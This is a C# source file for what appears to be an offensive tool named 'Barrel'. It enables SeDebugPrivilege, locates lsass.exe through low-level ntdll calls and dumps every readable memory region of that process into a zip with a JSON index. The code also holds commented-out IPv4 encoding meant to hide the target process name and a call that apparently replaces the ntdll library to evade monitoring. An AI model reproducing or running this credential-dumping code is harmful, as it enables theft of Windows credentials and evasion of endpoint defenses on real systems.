using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.IO.Compression;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static Barrel.NT;
using System.Collections;
using System.Text;


namespace Barrel
{
    internal class Program
    {
        // Constants
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_NOACCESS = 0x01;
        public const uint MemoryBasicInformation = 0;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;

        // Functions
        [DllImport("ntdll.dll")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")] public static extern bool NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);

        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);

        [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        // Structures
        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }

        // Custom Class
        public class MemFile
        {
            public string filename;
            public byte[] content;
            public MemFile(string filename, byte[] content)
            {
                this.filename = filename;
                this.content = content;
            }
        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static string getRandomString(int length, Random random)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            for (int i = 0; i < length; i++)
            {
                int index = random.Next(chars.Length);
                stringBuilder.Append(chars[index]);
            }
            return stringBuilder.ToString();
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static void WriteToFile(string path, string content)
        {
            System.IO.File.WriteAllText(path, content);
            Console.WriteLine("[+] File " + path + " generated.");
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public static IntPtr GetProcessByName(string proc_name)
        {
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;

            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                string current_proc_name = GetProcNameFromHandle(aux_handle);
                if (current_proc_name == proc_name)
                {
                    return aux_handle;
                }
            }
            return IntPtr.Zero;
        }


        unsafe static string GetProcNameFromHandle(IntPtr process_handle)
        {
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int commandline_offset = 0x68;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get PEB->ProcessParameters
            int processparameters_offset = 0x20;
            IntPtr processparameters_pointer = pebaddress + processparameters_offset;

            // Get ProcessParameters->CommandLine
            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer);
            IntPtr commandline_pointer = processparameters_adress + commandline_offset;
            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
            string commandline_value = ReadRemoteWStr(process_handle, commandline_address);
            return commandline_value;
        }


        public static void GenerateZip(string zipFilePath, List<MemFile> memfile_list)
        {
            // Check it exists, delete if it does
            if (File.Exists(zipFilePath)) { File.Delete(zipFilePath); }
            
            using (FileStream zipFileStream = new FileStream(zipFilePath, FileMode.Create))
            {
                using (ZipArchive archive = new ZipArchive(zipFileStream, ZipArchiveMode.Create, true))
                {
                    foreach (MemFile m in memfile_list)
                    {
                        ZipArchiveEntry entry = archive.CreateEntry(m.filename, CompressionLevel.Fastest);
                        using (Stream entryStream = entry.Open())
                        {
                            entryStream.Write(m.content, 0, m.content.Length);
                        }
                    }
                }
            }
            Console.WriteLine("[+] File " + zipFilePath + " generated.");
        }


        // Source: https://github.com/ricardojoserf/SharpObfuscate
        static byte[] getBytesFromIPv4(string ipv4_str)
        {
            int ipv4_size = 4;
            byte[] ipv4_bytes = new byte[ipv4_size];
            List<int> Ipv4Vals = ipv4_str.Split('.').Select(int.Parse).ToList();
            for (int i = 0; i < ipv4_size; i++)
            {
                ipv4_bytes[i] = (byte)(Ipv4Vals[i]);
            }
            return ipv4_bytes;
        }


        // Source: https://github.com/ricardojoserf/SharpObfuscate
        public static byte[] ToByteArray(String hexString)
        {
            // In case the string length is odd
            if (hexString.Length % 2 == 1)
            {
                Console.WriteLine("[-] Hexadecimal value length is odd, adding a 0.");
                hexString += "0";
            }
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        // Source: https://github.com/ricardojoserf/SharpObfuscate
        static string decodeIPv4(List<String> ipv4_str_list)
        {
            int ipv4_size = 4;
            string total_bytes_str = "";
            foreach (string ipv4_str in ipv4_str_list)
            {
                byte[] ipv4_bytes = getBytesFromIPv4(ipv4_str);
                for (int i = 0; i < ipv4_size; i++)
                {
                    total_bytes_str += ipv4_bytes[i].ToString("X2");
                }
            }
            return Encoding.UTF8.GetString(ToByteArray(total_bytes_str)).TrimEnd('\0');
        }


        static void Barrel(string json_filename, string zip_filename) {
            // Random seed
            Random random = new Random();
            
            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Decode process name (C:\\WINDOWS\\system32\\lsass.exe)
            // List<string> process_name_ipv4_encoded = new List<string> { "67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0" };
            // string proc_name = decodeIPv4(process_name_ipv4_encoded);
            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";

            // Get process handle
            IntPtr processHandle = GetProcessByName(proc_name);
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] It was not possible to get a process handle. If you get 0xC0000022 errors probably PEB is unreadable.");
                Environment.Exit(-1);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            List<MemFile> memfile_list = new List<MemFile> { };
            string[] aux_array_1 = { };
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemory(processHandle, aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and committed -> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);
                    
                    // Add to JSON file                    
                    string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                    aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();
                    
                    // Add to global byte array
                    MemFile memFile = new MemFile(memdump_filename, buffer);
                    memfile_list.Add(memFile);                    
                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }
            // Close process handle
            NtClose(processHandle);
            
            // Write JSON file
            string barrel_json_content = ToJsonArray(aux_array_1);
            WriteToFile(json_filename, barrel_json_content);
            GenerateZip(zip_filename, memfile_list);
        }


        static void Main(string[] args)
        {
            // Check binary is correctly compiled
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] File must be compiled as 64-byte binary.");
                Environment.Exit(-1);
            }
            
            // Replace ntdll library
            string option = "";
            string wildcard_option = "";
            if (args.Length >= 1)
            {
                option = args[0];
            }
            if (args.Length >= 2)
            {
                wildcard_option = args[1];
            }
            ReplaceLibrary(option, wildcard_option);

            // Get Mem64List information + Dump memory regions. Arguments: Name of JSON file
            string json_file = "barrel.json";
            string zip_file = "barrel.zip";
            Barrel(json_file, zip_file);
        }
    }
}